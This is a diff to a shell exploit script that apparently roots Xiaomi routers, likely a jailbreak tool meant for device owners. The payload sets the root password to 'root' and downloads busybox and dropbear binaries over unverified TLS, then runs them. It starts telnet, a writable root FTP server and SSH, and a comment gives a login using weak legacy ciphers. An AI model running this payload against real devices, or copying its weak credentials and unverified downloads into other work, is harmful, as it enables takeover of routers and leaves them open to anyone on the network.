@@ -7,7 +7,9 @@ exploit() {
     # Download standalone busybox and start telnet and ftp servers
     ########################################
 
-    passwd -d root # Remove root password, as the default one set by xiaomi is unknown
+    # Override existing password, as the default one set by xiaomi is unknown
+    # https://www.systutorials.com/changing-linux-users-password-in-one-command-line/
+    echo -e "root\nroot" | passwd root 
 
     # kill/stop telnet, in case it is running from a previous execution
     pgrep busybox | xargs kill || true
@@ -15,7 +17,7 @@ exploit() {
     cd /tmp
     rm -rf busybox
     # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
-    curl "https://www.busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel" --insecure --output busybox
+    curl "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel" --insecure --output busybox
     chmod +x busybox
 
     # Start telnet
@@ -26,6 +28,35 @@ exploit() {
     ./busybox tcpsvd -vE 0.0.0.0 21 ./ftpd -Sw / >> /tmp/messages 2>&1 &
 
     echo "Done exploiting"
+}
+
+start_ssh() {
+    cd /tmp
+
+    # Clean
+    rm -rf dropbear
+    rm -rf dropbear.tar.bz2
+    rm -rf /etc/dropbear
+
+    # kill/stop dropbear, in case it is running from a previous execution
+    pgrep dropbear | xargs kill || true
+
+    # Donwload dropbear static mipsel binary
+    curl "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/dropbear.tar.bz2" --insecure --output dropbear.tar.bz2
+    /tmp/busybox tar -xvfj dropbear.tar.bz2
+
+    # Add keys
+    # http://www.ibiblio.org/elemental/howto/dropbear-ssh.html
+    mkdir -p /etc/dropbear
+    cd /etc/dropbear
+    /tmp/dropbear/dropbearkey -t rsa -f dropbear_rsa_host_key
+    /tmp/dropbear/dropbearkey -t dss -f dropbear_dss_host_key
+
+    # Start SSH server
+    /tmp/dropbear/dropbear
+
+    # https://unix.stackexchange.com/a/402749
+    # Login with ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@192.168.0.21
 }
 
 remount() {
